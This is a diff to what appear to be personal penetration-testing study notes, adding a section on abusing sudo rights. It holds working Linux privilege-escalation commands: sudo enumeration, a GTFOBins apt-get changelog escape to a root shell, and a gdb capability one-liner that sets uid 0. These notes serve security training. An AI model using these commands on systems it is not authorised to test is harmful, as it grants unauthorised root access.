@@ -1439,8 +1439,6 @@ Reference
       `su - root` `aa-status`
     - ['Apt-get'](https://gtfobins.github.io/gtfobins/apt-get/#sudo) privilege escalation payload
       `sudo apt-get changelog apt`
-    - dd
-      
   - exploit kernel vulnerababilities 
 
 ### 19. Port redirection and SSH tunneling
@@ -2530,7 +2528,13 @@ Reference
     output: /usr/bin/gdb = cap_setuid+ep  
     `gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit`
 - 18.4.2 Abusing sudo
-  - 
+  scan:  sudo -l
+  [gtfobins](https://gtfobins.github.io/gtfobins/tcpdump/#sudo)
+  - Q1 abuse sudo: apt-get  
+    `sudo apt-get changelog apt`  
+    `!/bin/sh`  
+  - Q2 abuse sudo: gcc
+    `/usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/gcc`  
 
 ## Penetration testing report 
 - note editor:
